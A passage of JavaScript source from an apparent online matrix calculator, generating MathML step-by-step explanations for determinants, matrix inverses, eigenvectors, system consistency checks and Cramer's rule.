data-cells=\"[[0,2],[1,3],[2,4]]\">${matrix5x3}</span></span></span></td></tr><tr><td><math><mrow><mrow><mo>&minus;</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mrow><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mrow><mo>&minus;</mo><mrow><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mrow><mo>&minus;</mo><mrow><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub><mo>&sdot;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mrow></math>${link}</td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,1],[1,2],[2,3]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,2],[1,3],[2,4]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[0,2],[1,1],[2,0]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[0,3],[1,2],[2,1]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[0,4],[1,3],[2,2]]\">${matrix5x3}</span></span></span></span></span></span></td></tr></table>",
  "someDetails3": "<span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,0],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[0,2],[2,0]]\"><math><mtable rowspacing=\"0ex\"><mtr><mtd><mrow style=\"font-weight: bolder\"><menclose notation=\"circle\"><msub><mi>a</mi><mrow><mi>r</mi><mo>,</mo><mi>c</mi></mrow></msub></menclose></mrow></mtd><mtd><mtext>&hellip;</mtext></mtd><mtd><msub><mi>a</mi><mrow><mi>r</mi><mo>,</mo><mi>j</mi></mrow></msub></mtd></mtr><mtr><mtd><mtext>&vellip;</mtext></mtd><mtd></mtd><mtd><mtext>&vellip;</mtext></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mi>i</mi><mo>,</mo><mi>c</mi></mrow></msub></mtd><mtd><mtext>&hellip;</mtext></mtd><mtd><msub><mi>a</mi><mrow><mi>i</mi><mo>,</mo><mi>j</mi></mrow></msub></mtd></mtr></mtable></math></span></span>",
  "": ""
};

Expression.getSomeDetails = function (id) {
  var s = Expression.someDetailsNew[id];
  return s.replace(/\$\{determinant3x3\}/g, Expression.someDetailsNew.determinant3x3).replace(/\$\{matrix3x3\}/g, Expression.someDetailsNew.matrix3x3).replace(/\$\{matrix5x3\}/g, Expression.someDetailsNew.matrix5x3).replace(/\<mn>(\d+)\<\/mn>/g, function (p, digits) {
    return Expression.p(Number(digits));
  });
};

Expression.Details.add({
  type: "inverse-2x2",
  i18n: undefined,
  minRows: 2,
  maxRows: 2,
  callback: function (printOptions, matrix) {
    var html = "";
    html += "<div>";
    html += i18n.inverse.inverse2x2;
    html += " ";
    html += "<math>";
    html += Expression.p("A^-1={{a, b}, {c, d}}^-1=1/determinant(A)*{{C_11, C_21}, {C_12, C_22}}=1/(a*d-b*c)*{{d, -b}, {-c, a}}");
    html += "</math>";
    html += i18n.inverse2x2Link;
    html += "</div>";
    var det = matrix.e(0, 0).multiply(matrix.e(1, 1)).subtract(matrix.e(0, 1).multiply(matrix.e(1, 0))); // TODO: highlight (?)

    html += "<math>";
    html += Expression.p("A^-1=1/(a*d-b*c)*{{d, n}, {m, a}}" + (det.equals(Expression.ZERO) ? "=1/0*{{d, n}, {m, a}}" : "=t"), {
      A: new Expression.Matrix(matrix),
      a: matrix.e(0, 0),
      b: matrix.e(0, 1),
      c: matrix.e(1, 0),
      d: matrix.e(1, 1),
      n: matrix.e(0, 1).negate(),
      m: matrix.e(1, 0).negate(),
      t: det.equals(Expression.ZERO) ? undefined : new Expression.Matrix(matrix.inverse())
    }, printOptions);
    html += "</math>";
    return html;
  }
});
Expression.Details.add({
  type: "determinant-2x2",
  i18n: undefined,
  minRows: 2,
  maxRows: 2,
  callback: function (printOptions, matrix) {
    var html = "<div>" + Expression.getSomeDetails("determinant2x2", printOptions).replace(/\$\{link\}/g, i18n.determinant2x2Link) + "</div>";
    var determinantResult = matrix.e(0, 0).multiply(matrix.e(1, 1)).subtract(matrix.e(0, 1).multiply(matrix.e(1, 0)));
    html += "<math>";
    html += Expression.p("determinant(A)=a*d-b*c=r", {
      A: new Expression.Matrix(matrix),
      a: matrix.e(0, 0),
      b: matrix.e(0, 1),
      c: matrix.e(1, 0),
      d: matrix.e(1, 1),
      r: determinantResult
    }, printOptions);
    html += "</math>";
    return html;
  }
}); // ---------------------------------------- determinant -----------------------------------------------

var getDeterminant = function (matrix, k, r, z, coefficient) {
  if (matrix.cols() === 1) {
    return coefficient.multiply(matrix.e(0, 0));
  }

  var o = Expression.ZERO;

  for (var i = 0; i < matrix.cols(); i += 1) {
    // complement matrix for element e(i, k)
    var mx = matrix.minorMatrix(i, k);
    var e = matrix.e(i, k);
    var kk = coefficient.multiply(Expression.ONE.negate().pow((i + k) % 2 !== 0 ? Expression.ONE : Expression.ZERO).multiply(e));
    r.push({
      m: mx,
      a: kk,
      z: z,
      minor: new Expression.Minor(new Expression.Matrix(matrix), i, k),
      e: e
    });
    o = o.add(getDeterminant(mx, 0, r, z + 1, kk));
  }

  return o;
};

Expression.expandDeterminant = function (matrix, byRow, number, printOptions) {
  //TODO: highlight same elements
  var r = [];
  var k = Number(number.toString()) - 1; //!

  if (!matrix.isSquare()) {
    throw new RangeError("NonSquareMatrixException");
  }

  if (k >= matrix.rows() || k < 0 || k !== Math.floor(k)) {
    // matrix.isSquare() === true
    throw new RangeError("IntegerInputError" + ":" + (byRow ? "k-A-e-r" : "k-A-e-c"));
  } //!


  var result = null;

  if (byRow) {
    // expansion by row k
    result = getDeterminant(matrix.transpose(), k, r, 1, Expression.ONE);
    var l = -1;

    while (++l < r.length) {
      r[l].m = r[l].m.transpose();
      r[l].minor = new Expression.Minor(new Expression.Matrix(r[l].minor.a.matrix.transpose()), r[l].minor.j, r[l].minor.i);
    }
  } else {
    result = getDeterminant(matrix, k, r, 1, Expression.ONE); // expansion by column k
  }

  var html = "";
  html += "<math>";
  html += new Expression.Determinant(new Expression.Matrix(matrix)).toMathML(printOptions);
  html += "<mo>=</mo>";
  var z = matrix.cols() - 1;

  for (var i = 1; i < z; i += 1) {
    var e = "";

    for (var j = 0; j < r.length; j += 1) {
      if (r[j].z === i && !r[j].a.equals(Expression.ZERO)) {
        var det = new Expression.Determinant(new Expression.Matrix(r[j].m));
        var current = new Expression.Multiplication(new NonSimplifiedExpression(r[j].a), det);

        if (e !== "") {
          e += "<mo>+</mo>";
        }

        if (i !== 1) {
          e += current.toMathML(printOptions);
        } else {
          e += Expression.p("(-1)**(i+j)*e*A", {
            i: Expression.Integer.fromNumber(r[j].minor.i + 1),
            j: Expression.Integer.fromNumber(r[j].minor.j + 1),
            e: r[j].e,
            A: r[j].minor
          }, printOptions);
        }
      }
    }

    if (e != undefined) {
      // all zeros
      html += "<mrow>";
      html += e;
      html += "</mrow>";
      html += "<mo>=</mo>";
    }
  }

  html += result.toMathML(printOptions);
  html += "</math>";
  return html;
};

Expression.Details.add({
  type: "eigenvectors",
  minRows: 2,
  callback: function (printOptions, matrix) {
    if (matrix.cols() <= 3) {
      return Expression.Details.getCallback("steps-to-find-eigenvectors")(printOptions, matrix);
    }

    if (!matrix.isSquare()) {
      throw new RangeError("NonSquareMatrixException");
    }

    var html = '';
    html += '<math>' + Expression.p('A=M', {
      M: new Expression.Matrix(matrix)
    }, printOptions) + '</math>'; //TODO: !?

    i18n.vectors.eigenvectorsForTheMatrixA = 'Eigenvectors for the matrix `A`:';

    if (document.documentElement.lang === 'ru') {
      i18n.vectors.eigenvectorsForTheMatrixA = 'Ð¡Ð¾Ð±ÑÑ‚Ð²ÐµÐ½Ð½Ñ‹Ðµ Ð²ÐµÐºÑ‚Ð¾Ñ€Ñ‹ Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†Ñ‹ `A`:';
    }

    if (document.documentElement.lang === 'uk') {
      i18n.vectors.eigenvectorsForTheMatrixA = 'Ð’Ð»Ð°ÑÐ½Ñ– Ð²ÐµÐºÑ‚Ð¾Ñ€Ð¸ Ð´Ð»Ñ Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†Ñ– `A`:';
    }

    var title = i18n.vectors.eigenvectorsForTheMatrixA; //TODO: !?

    html += '<p>' + title.replaceAll('`A`', '<math>' + Expression.p('A') + '</math>') + '</p>';
    html += '<ul>';
    var eigenvalues = Expression.getEigenvalues(matrix);
    var eigenvectors = Expression.getEigenvectors(matrix, eigenvalues);
    var uniqueEigenvalues = Expression.unique(eigenvalues);

    for (var i = 0; i < eigenvectors.length; i += 1) {
      if (eigenvectors[i] != null) {
        var x = eigenvalues[i];
        var j = uniqueEigenvalues.indexOf(x);
        html += '<li>';
        var v = eigenvectors[i];
        html += '<math>' + Expression.p('v=x', {
          v: new Expression.MatrixSymbol('v'),
          x: new Expression.Matrix(v)
        }, printOptions) + '</math>' + ', ' + i18n.JordanDecomposition.eigenvalue.toLocaleLowerCase() + ' ' + '<math>' + Expression.p('Î»_' + (j + 1) + '=x', {
          x: x
        }, printOptions) + '</math>';
        html += '</li>';
      }
    }

    html += '</ul>';
    var detailsHTML = createDetailsSummary(printOptions.idPrefix, [{
      type: 'steps-to-find-eigenvectors',
      matrix: matrix.toString(),
      second: undefined
    }]);
    html += detailsHTML;
    return html;
  }
});
Expression.Details.add({
  type: "steps-to-find-eigenvectors",
  minRows: 2,
  callback: function (printOptions, matrix) {
    if (!matrix.isSquare()) {
      throw new RangeError("NonSquareMatrixException");
    }

    var html = "";
    html += "<ol>";
    var tmp = Expression.getEigenvaluesWithSteps(printOptions, matrix);
    var eigenvalues = tmp.eigenvalues;
    html += "<li>";
    html += tmp.html;
    html += "</li>";

    if (eigenvalues.length > 0) {
      var tmp2 = Expression.getEigenvectorsWithSteps(printOptions, matrix, eigenvalues);
      html += "<li>";
      html += tmp2.html;
      html += "</li>";
    } else {
      html += "<li>";
      html += i18n.eigenvalues.thereAreNoRationalSolutions;
      html += "</li>";
    }

    html += "</ol>";
    return html;
  }
}); //!

Expression.Details.add({
  type: "expand-along-column",
  minRows: 3,
  callback: function (printOptions, matrix, columnNumber) {
    return Expression.expandDeterminant(matrix, false, columnNumber, printOptions);
  }
});
Expression.Details.add({
  type: "expand-along-row",
  minRows: 3,
  callback: function (printOptions, matrix, rowNumber) {
    return Expression.expandDeterminant(matrix, true, rowNumber, printOptions);
  }
});
Expression.Details.add({
  type: "obtain-zeros-in-column",
  minRows: 3,
  callback: function (printOptions, matrix, columnNumber) {
    return Expression.getZero(matrix, false, columnNumber, printOptions);
  }
});
Expression.Details.add({
  type: "obtain-zeros-in-row",
  minRows: 3,
  callback: function (printOptions, matrix, rowNumber) {
    return Expression.getZero(matrix, true, rowNumber, printOptions);
  }
});

var determinant3x3 = function (printOptions, matrix, text) {
  var containerId = printOptions.idPrefix + "-" + Expression.id();

  if (matrix.cols() !== 3 || matrix.rows() !== 3) {
    throw new RangeError("NonSquareMatrixException:" + i18n.determinant.theRuleOfSarrusCanBeUsedOnlyWith3x3Matrices);
  } //TODO: replace


  var matrixId = containerId;

  var cellId = function (i, j) {
    return matrixId + "_" + i.toString() + "_" + j.toString();
  };

  var higlights = "";
  var html = ""; //html += "<div>" + text + "</div>";

  html += "<div class=\"math-block\">" + text + "</div>";
  html += "<math>";
  html += new Expression.Determinant(new Expression.Matrix(matrix)).toMathML(Object.assign({}, printOptions, {
    cellIdGenerator: function (i, j) {
      return cellId(i, j);
    }
  }));
  html += "<mo>=</mo>";
  html += "<mrow>"; // TODO: clickable highlight with initially selected group

  var z = ["a_11*a_22*a_33", "a_12*a_23*a_31", "a_13*a_21*a_32", "a_31*a_22*a_13", "a_32*a_23*a_11", "a_33*a_21*a_12"];
  var context = new ExpressionParser.Context(function (id) {
    return matrix.e(Number(id.slice(2, 3)) - 1, Number(id.slice(3, 4)) - 1);
  });
  var determinant = undefined;

  for (var i = 0; i < z.length; i += 1) {
    var e = ExpressionParser.parse(z[i], context);

    if (i !== 0) {
      var sign = i < 3 ? "+" : "&minus;";
      html += "<mo>" + sign + "</mo>";
    }

    var highlight = z[i].replace(/a_(\d)(\d)\*?/g, function (x, si, sj) {
      var i = Number(si) - 1;
      var j = Number(sj) - 1;
      return "#" + cellId(i, j) + ", ";
    }).slice(0, -2);
    html += "<mrow id=\"" + (matrixId + "_x" + i.toString()) + "\">";
    html += e.toMathML(Object.assign({}, printOptions, {
      isTopLevel: false
    }));
    html += "</mrow>";
    higlights += "<a class=\"a-highlight\" data-for=\"" + (matrixId + "_x" + i.toString()) + "\" data-highlight=\"" + highlight + "\"></a>";
    determinant = i === 0 ? e : i < 3 ? determinant.add(e) : determinant.subtract(e);
  }

  html += "</mrow>";
  html += "<mo>=</mo>";
  html += determinant.simplify().toMathML(printOptions);
  html += "</math>";
  html += '<div hidden>' + higlights + '</div>';
  return html;
}; //TODO: fix - i18n.unused.determinant.usingSarrusRule


Expression.Details.add({
  type: "determinant-Sarrus",
  i18n: function () {
    return i18n.det.ruleOfSarrus;
  },
  minRows: 3,
  maxRows: 3,
  priority: 2,
  callback: function (printOptions, matrix) {
    return determinant3x3(printOptions, matrix, Expression.getSomeDetails("determinantSarrus").replace(/\$\{link\}/g, i18n.ruleOfSarrusLink));
  }
});
Expression.Details.add({
  type: "determinant-Triangle",
  i18n: function () {
    return i18n.det.ruleOfTriangle;
  },
  minRows: 3,
  maxRows: 3,
  priority: 3,
  callback: function (printOptions, matrix) {
    return determinant3x3(printOptions, matrix, Expression.getSomeDetails("determinantTriangle").replace(/\$\{link\}/g, i18n.ruleOfTriangleLink));
  }
}); // https://www.math.susu.ac.ru/193-2.html
// https://en.wikipedia.org/wiki/Permutation#Generation_in_lexicographic_order

Matrix.permutations = function (n, callback) {
  function reverse(p, from, to, even) {
    for (var i = from; i < to - 1 - (i - from); i += 1) {
      var j = to - 1 - (i - from);
      var tmp = p[j];
      p[j] = p[i];
      p[i] = tmp;
      even = !even;
    }

    return even;
  }

  if (n !== Math.floor(n) || n < 1) {
    throw new RangeError();
  }

  var p = new Array(n);
  var even = true;

  for (var i = 0; i < n; i += 1) {
    p[i] = i;
  }

  while (true) {
    var indexOfZero = callback(p, even);
    even = reverse(p, indexOfZero + 1, n, even);
    var k = n - 2;
    var l = n - 1;

    while (k >= 0 && p[k] > p[k + 1]) {
      k -= 1;
    }

    if (k < 0) {
      return;
    }

    while (p[k] > p[l]) {
      l -= 1;
    }

    var tmp = p[k];
    p[k] = p[l];
    p[l] = tmp;
    even = !even;
    even = reverse(p, k + 1, n, even);
  }
};

Matrix.prototype.determinantLeibniz = function () {
  if (!this.isSquare()) {
    throw new RangeError("NonSquareMatrixException");
  } //TODO: output (?) + 0 + ... + 0


  var determinant = undefined;
  var bestZeroGroup = null;
  var bestZeroGroupIndexOfZero = 0;
  var matrix = this;
  var n = matrix.cols(); //TODO: skip iterations when an element is zero

  Matrix.permutations(n, function (p, even) {
    var t = undefined;
    var indexOfZero = n;

    for (var i = 0; i < n; i += 1) {
      var e = matrix.e(i, p[i]);

      if (e.unwrap().equals(Expression.ZERO)) {
        if (indexOfZero === n) {
          indexOfZero = i;
        }
      }

      t = t == undefined ? e : t.multiply(e);
    }

    if (indexOfZero < n && n > 4 && t instanceof NonSimplifiedExpression) {
      //TODO: ?
      //TODO: output 0 + ... + 0
      //t = t instanceof NonSimplifiedExpression ? new NonSimplifiedExpression(Expression.ZERO) : Expression.ZERO;
      //determinant = determinant == undefined ? (even ? t : t.negate()) : (even ? determinant.add(t) : determinant.subtract(t));
      if (bestZeroGroupIndexOfZero < indexOfZero) {
        bestZeroGroupIndexOfZero = indexOfZero;
        bestZeroGroup = even ? t : t.negate();
      }
    } else {
      determinant = determinant == undefined ? even ? t : t.negate() : even ? determinant.add(t) : determinant.subtract(t);
    }

    return indexOfZero < n ? indexOfZero : n;
  });

  if (determinant == undefined) {
    determinant = bestZeroGroup;
  }

  console.assert(determinant != undefined);
  return determinant == undefined ? Expression.ZERO : determinant;
}; //???


Expression.Details.add({
  type: "determinant-Leibniz",
  i18n: function () {
    return i18n.det.formulaOfLeibniz;
  },
  minRows: 4,
  //TODO: when a lot of zeros (?): compute the number of permutations (?)
  maxRows: 6,
  //?
  priority: -2,
  callback: function (printOptions, matrix) {
    var highlights = '';
    var html = "";
    html += "<math>";

    if (true) {
      var nsMatrix = matrix.map(function (e, i, j) {
        return new NonSimplifiedExpression(e);
      });
      html += new Expression.Determinant(new Expression.Matrix(nsMatrix)).toMathML(Object.assign({}, printOptions, {
        cellIdGenerator: function (i, j) {
          return nsMatrix.e(i, j).getId();
        }
      }));
      html += "<mo>=</mo>";
      var e = nsMatrix.determinantLeibniz();
      var elements = [];

      for (var s = e; s != null; s = (s.unwrap() instanceof Expression.Addition || s.unwrap() instanceof Expression.Subtraction) && s.unwrap().a instanceof NonSimplifiedExpression ? s.unwrap().a : null) {
        var x = (s.unwrap() instanceof Expression.Addition || s.unwrap() instanceof Expression.Subtraction) && s.unwrap().a instanceof NonSimplifiedExpression ? s.unwrap().b : s;
        elements.push({
          e: x,
          sign: s.unwrap() instanceof Expression.Subtraction ? '&minus;' : '+'
        });
      }

      html += elements.length !== 1 ? '<mrow>' : '';

      for (var i = elements.length - 1; i >= 0; i -= 1) {
        var x = elements[i].e;
        var sign = elements[i].sign;

        if (i !== elements.length - 1 || sign !== '+') {
          //TODO: some details about sign
          html += '<mpadded width="+0.8em" lspace="+0.4em">' + '<mo>' + sign + '</mo>' + '</mpadded>';
        }

        html += "<mrow id=\"" + x.getId() + "\">";
        html += x.toMathML(printOptions);
        html += "</mrow>";
        var highlight = '<a class="a-highlight" data-for="' + x.getId().toString() + '" data-highlight="' + x.unwrap().getIds() + '"></a>';
        highlights += highlight;
      }

      html += elements.length !== 1 ? '</mrow>' : '';
    } else {
      html += new Expression.Determinant(new Expression.Matrix(matrix)).toMathML(printOptions); //TODO: formula - ?
      //html += "<mo>=</mo>";
      //html += "";

      html += "<mo>=</mo>";
      html += matrix.map(function (e, i, j) {
        return new NonSimplifiedExpression(e);
      }).determinantLeibniz().toMathML(printOptions);
    }

    if (matrix.cols() > 1) {
      html += "<mo>=</mo>";
      html += matrix.determinantLeibniz().toMathML(printOptions);
    }

    html += "</math>";
    html += " ";
    html += i18n.determinantLeibnizLink;
    html += '<div hidden>' + highlights + '</div>';
    return html;
  }
});

Expression.mgetZero = function (m, k, callback) {
  // m == n ; in a column k -- find in k-column non-zero element and ... subtract
  callback = callback || undefined;
  var i = 0;

  while (i < m.rows() && m.e(i, k).equals(Expression.ZERO)) {
    i += 1;
  }

  if (i < m.rows()) {
    // Matrix.toRowEchelonStep - ?
    var j = -1;

    while (++j < m.rows()) {
      if (j !== i) {
        if (!m.e(j, k).equals(Expression.ZERO)) {
          var oldMatrix = m;
          m = m.rowReduce(j, i, k);

          if (callback != undefined) {
            callback({
              previousPivot: undefined,
              newMatrix: m,
              oldMatrix: oldMatrix,
              type: "reduce",
              targetRow: j,
              pivotRow: i,
              pivotColumn: k
            });
          }
        }
      }
    }

    return {
      B: m,
      c: {
        e: m.e(i, k),
        i: i,
        j: k
      }
    }; // r?
  }

  return {
    B: m,
    c: null
  };
}; //TODO: better details


Expression.getZero = function (matrix, atRow, number, printOptions) {
  var k = Number(number.toString()) - 1; //!

  if (!matrix.isSquare()) {
    throw new RangeError("NonSquareMatrixException");
  }

  if (k >= matrix.rows() || k < 0 || k !== Math.floor(k)) {
    // matrix.isSquare() === true
    throw new RangeError("IntegerInputError" + ":" + (atRow ? "k-A-o-r" : "k-A-o-c"));
  } //!


  var containerId = printOptions.idPrefix; //?

  var text = "";
  var html = "";

  if (atRow) {
    html += "<math>";
  }

  var step = 1;
  var tmp = Expression.mgetZero(atRow ? matrix.transpose() : matrix, k, function (change) {
    if (atRow) {
      //TODO:
      html += new Expression.Determinant(new Expression.Matrix(change.oldMatrix.transpose())).toMathML(printOptions);
      var jT = "<code>" + localeString(change.targetRow + 1) + "</code>";
      var iT = "<code>" + localeString(change.pivotRow + 1) + "</code>"; //TODO: why English is not used as fallback ?

      var multiplier = change.oldMatrix.e(change.targetRow, change.pivotColumn).divide(change.oldMatrix.e(change.pivotRow, change.pivotColumn));
      var areBracketsRequired = multiplier.getPrecedence() !== Expression.ZERO.getPrecedence(); //? not simple

      var questionId = containerId + "-" + step + "-" + "question-mark";
      var tooltip = (i18n.eliminationDetails.columnSubtraction || '').replace(/\$\{a\}/g, "<code>" + "<math>" + (areBracketsRequired ? "<mrow><mo>(</mo>" : "") + multiplier.toMathML(printOptions) + (areBracketsRequired ? "<mo>)</mo></mrow>" : "") + "</math>" + "</code>").replace(/\$\{j\}/g, jT).replace(/\$\{i\}/g, iT).replace(/\$\{someDetails3\}/g, Expression.getSomeDetails("someDetails3"));
      tooltip += ''; //TODO: class

      html += '<mpadded width="+0.8em" lspace="+0.4em">';
      html += '<mover accent="true"><mo>=</mo><mtext><a class="question-icon-new" id="' + questionId + '">?</a><a class="a-tooltip" data-for="' + questionId + '" hidden>' + tooltip + '</a></mtext></mover>';
      html += '</mpadded>';
    } else {
      html += Expression.rowReduceChangeToHTML(change, Object.assign({}, printOptions, {
        _isDeterminant: true
      }), containerId, step, Condition.TRUE);
    }

    step += 1;
  });
  var B = tmp.B;
  var c = tmp.c;

  if (atRow) {
    B = B.transpose();
    c = c == null ? null : {
      e: c.e,
      i: c.j,
      j: c.i
    };
  }

  if (!atRow) {
    html += "<math>";
  } //TODO: share with the `Expression.rowReduceChangeToHTML` !!!


  var cellId = function (k, i, j) {
    return containerId + "-" + k.toString() + "-" + i.toString() + "-" + j.toString();
  };

  html += new Expression.Determinant(new Expression.Matrix(B)).toMathML(Object.assign({}, printOptions, {
    cellIdGenerator: function (i, j) {
      return cellId(step, i, j);
    }
  }));
  html += "<mo>=</mo>";
  var result = null;

  if (c == null) {
    result = Expression.ZERO;
  } else {
    var t = B.minorMatrix(c.i, c.j);

    if (t.cols() === 0) {
      result = c.e;
    } else {
      var n = Expression.Integer.fromNumber(Math.pow(-1, c.i + c.j));
      result = n.multiply(c.e).multiply(t.determinant());
      var ie = new NonSimplifiedExpression(Expression.Integer.fromNumber(c.i + 1));
      var je = new NonSimplifiedExpression(Expression.Integer.fromNumber(c.j + 1));
      html += Expression.p('(-1)**(i+j)*e*D', {
        i: ie,
        j: je,
        e: c.e,
        // TODO: link the element
        D: new Expression.Minor(new Expression.Matrix(B), c.i, c.j)
      }, Object.assign({}, printOptions, {
        printId: true
      })); // TODO: share with expansion

      text += '<a class="a-tooltip" data-for="' + ie.getId() + '" hidden>';
      text += '<math>' + '<msub><mi>a</mi><mrow><mrow style="font-weight: bolder">' + Expression.p(c.i + 1) + '</mrow><mo>,</mo>' + Expression.p(c.j + 1) + '</mrow></msub>' + '</math>';
      text += '</a>';
      text += '<a class="a-tooltip" data-for="' + je.getId() + '" hidden>';
      text += '<math>' + '<msub><mi>a</mi><mrow>' + Expression.p(c.i + 1) + '<mo>,</mo><mrow style="font-weight: bolder">' + Expression.p(c.j + 1) + '</mrow></mrow></msub>' + '</math>';
      text += '</a>';
      html += "<mo>=</mo>";
    }
  }

  html += result.toMathML(printOptions);
  html += "</math>";
  html += "<span hidden>" + text + "</span>";
  return html;
}; // --------------------------------------------- end ----------------------------------------------
// ---------------------------------------- sle -----------------------------------------------


Matrix.trimRight = function (x) {
  var lastColumn = -1;
  x.map(function (e, i, j) {
    if (lastColumn < j && !e.equals(Expression.ZERO)) {
      lastColumn = j;
    }

    return e;
  });
  return x.slice(0, x.rows(), 0, lastColumn + 1);
};

var testSLECompatibility = function (printOptions, fullMatrix) {
  if (fullMatrix.cols() < 1) {
    throw new RangeError("ValueMissingError:A-textarea"); //TODO: fix
  }

  var st = "<h4>" + i18n.consistency.analyseCompatibilityOfTheSystem + "</h4>"; //TODO: fix i18n

  st += "<p>" + i18n.consistency.analyseCompatibilityIntroduction + "</p>";
  var m = Matrix.trimRight(fullMatrix.slice(0, fullMatrix.rows(), 0, fullMatrix.cols() - 1));
  var b = fullMatrix.slice(0, fullMatrix.rows(), fullMatrix.cols() - 1, fullMatrix.cols());
  var augmented = m.augment(b);
  var results = [];
  Matrix.toRowEchelonWithCallback(augmented, Matrix.GaussMontante, "", null, function (result) {
    results.push(result);
  });

  if (results.length > 1) {
    st += "<ol>";
  }

  for (var i = 0; i < results.length; i += 1) {
    st += results.length > 1 ? "<li><div>" + "<math>" + results[i].condition.toMathML(printOptions) + "</math>" : "";
    var t = results[i].matrix;
    var mRank = t.slice(0, t.rows(), 0, t.cols() - 1).rank();
    var augmentedRank = t.rank(); //var mRank = m.rank();
    //var augmentedRank = augmented.rank();

    st += "<div>";
    st += "<math>";
    st += new Expression.Rank(new Expression.Matrix(augmented)).toMathML(Object.assign({}, printOptions, {
      columnlines: -1
    })) + "<mo>=</mo>" + Expression.p(augmentedRank);
    st += "</math>";
    st += "</div>"; //st += createDetailsSummary(printOptions.idPrefix, [{type: "rank", matrix: augmented.toString(), second: undefined}]);

    st += "<div>";
    st += "<math>";
    st += new Expression.Rank(new Expression.Matrix(m)).toMathML(printOptions) + "<mo>=</mo>" + Expression.p(mRank);
    st += "</math>";
    st += "</div>"; //st += createDetailsSummary(printOptions.idPrefix, [{type: "rank", matrix: m.toString(), second: undefined}]);

    st += "<div>";

    if (mRank === augmentedRank) {
      if (m.cols() === mRank) {
        st += i18n.consistency.theSystemIsConsistentAndItHasAUniqueSolution;
      } else {
        st += i18n.consistency.theSystemIsConsistentAndItHasInfiniteNumberOfSolutions;
      }
    } else {
      st += i18n.consistency.theSystemIsInconsistent;
    }

    st += "</div>";
    st += results.length > 1 ? "</div></li>" : "";
  }

  if (results.length > 1) {
    st += "</ol>";
  } //!new


  st += createDetailsSummary(printOptions.idPrefix, [{
    type: "rank",
    matrix: augmented.toString(),
    second: undefined
  }]); //!new

  return st;
};

Expression.Details.add({
  type: "analyse-compatibility",
  i18n: function () {
    return i18n.slu.testForConsistency; //?
  },
  minRows: 1,
  callback: function (printOptions, matrix) {
    return testSLECompatibility(printOptions, matrix);
  }
}); //TODO: move

var outSystem = function (printOptions, matrix, variableNames) {
  return new Expression.Matrix(matrix).toMathML(Object.assign({}, printOptions, {
    variableNames: variableNames,
    useBraces: ["{", " "]
  }));
}; //! TODO: (!)


var makeDefaultVariableNames = function (count) {
  var variableNames = new Array(count);

  for (var i = 0; i < count; i += 1) {
    variableNames[i] = "x_" + (i + 1).toString();
  }

  return variableNames;
};

var solveUsingCramersRule = function (printOptions, fullMatrix, variableNames) {
  if (fullMatrix.cols() < 2) {
    throw new RangeError("ValueMissingError:A-textarea"); //TODO: fix
  } // TODO: fix
  //!hack


  if (variableNames == undefined) {
    variableNames = makeDefaultVariableNames(fullMatrix.cols() - 1);
  }

  var m = Matrix.trimRight(fullMatrix.slice(0, fullMatrix.rows(), 0, fullMatrix.cols() - 1));
  var b = fullMatrix.slice(0, fullMatrix.rows(), fullMatrix.cols() - 1, fullMatrix.cols());

  if (!m.isSquare()) {
    throw new RangeError("NonSquareMatrixException:" + i18n.systems.forSolutionUsingCramersRuleNumberOfEquationsShouldBeEqualNumberOfVariables);
  }

  var D0 = m.determinant();
  var mstr = "";
  mstr = "<h4>" + i18n.systems.solutionByRuleOfCramer + "</h4>";
  mstr += "<div>";
  mstr += "<math>";
  mstr += outSystem(printOptions, fullMatrix, variableNames);
  mstr += "</math>";
  mstr += "</div>";
  mstr += "<div>";
  mstr += "<math>";
  mstr += "<mi>Î”</mi>";
  mstr += "<mo>=</mo>" + new Expression.Determinant(new Expression.Matrix(m)).toMathML(printOptions);
  mstr += "<mo>=</mo>" + D0.toMathML(printOptions);
  mstr += "</math>";
  mstr += "</div>";
  mstr += createDetailsSummary(printOptions.idPrefix, [{
    type: m.getDeterminantEventType("determinant").type,
    matrix: m.toString(),
    second: undefined
  }]);

  if (D0.equals(Expression.ZERO)) {
    //TODO: fix text
    mstr += "<div>";
    mstr += i18n.systems.forSolutionUsingCramersRuleCoefficientMatrixShouldHaveNonZeroDeterminant;
    mstr += "</div>";
    return mstr;
  }

  var d = new Array(m.cols());
  mstr += '<ul class="list-unstyled">';

  for (var i = 0; i < m.cols(); i += 1) {
    mstr += "<li>";
    var m1 = m.map(function (e, row, col) {
      return col === i ? b.e(row, 0) : e;
    });
    d[i] = m1.determinant();
    mstr += "<math>";
    mstr += "<msub><mi>Î”</mi>" + Expression.p(i + 1) + "</msub>" + "<mo>=</mo>" + new Expression.Determinant(new Expression.Matrix(m1)).toMathML(printOptions) + "<mo>=</mo>" + d[i].toMathML(printOptions);
    mstr += "</math>";
    mstr += ";";
    mstr += createDetailsSummary(printOptions.idPrefix, [{
      type: m1.getDeterminantEventType("determinant").type,
      matrix: m1.toString(),
      second: undefined
    }]);
    mstr += "</li>";
  }

